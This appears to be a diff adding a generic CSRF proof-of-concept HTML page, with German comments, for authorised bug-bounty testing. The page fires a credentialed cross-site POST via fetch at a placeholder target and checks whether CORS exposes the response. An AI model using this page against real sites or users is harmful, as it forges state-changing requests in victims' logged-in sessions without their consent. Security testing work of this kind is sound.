@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<!--
+  CSRF-PoC: credentialed fetch. Testet SameSite=None-Cookies und CORS-Lesbarkeit.
+  Hinweis: funktioniert cross-site nur, wenn Cookies SameSite=None haben (oder
+  same-site-Subdomain-Kontext) und der Server bei CORS die Antwort freigibt.
+  mode:'no-cors' sendet den Request auch ohne lesbare Response (blinder Schuss,
+  Seiteneffekt serverseitig prüfen).
+
+  Nur auf autorisierte Bug-Bounty-Targets anwenden, nur mit eigenen Testaccounts.
+-->
+<html>
+<head><meta charset="utf-8"><title>CSRF PoC (fetch)</title></head>
+<body>
+<pre id="log">running…</pre>
+<script>
+const TARGET = 'https://TARGET.example/ACTION_PATH';
+
+fetch(TARGET, {
+  method: 'POST',
+  credentials: 'include',            // Cookies mitschicken (sofern SameSite es erlaubt)
+  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+  body: 'param1=value1&param2=value2'
+})
+.then(r => {
+  document.getElementById('log').textContent = 'HTTP ' + r.status;
+  return r.text();
+})
+.then(t => {
+  // Response lesbar? Dann CORS reflektiert Origin + credentials → zusätzlich melden.
+  document.getElementById('log').textContent += '\nResponse lesbar:\n' + t.slice(0, 500);
+})
+.catch(e => {
+  // TypeError = Response nicht lesbar oder Request geblockt. Request kann trotzdem
+  // rausgegangen sein → Seiteneffekt serverseitig verifizieren!
+  document.getElementById('log').textContent = 'nicht lesbar (' + e + ') — Seiteneffekt prüfen';
+});
+</script>
+</body>
+</html>
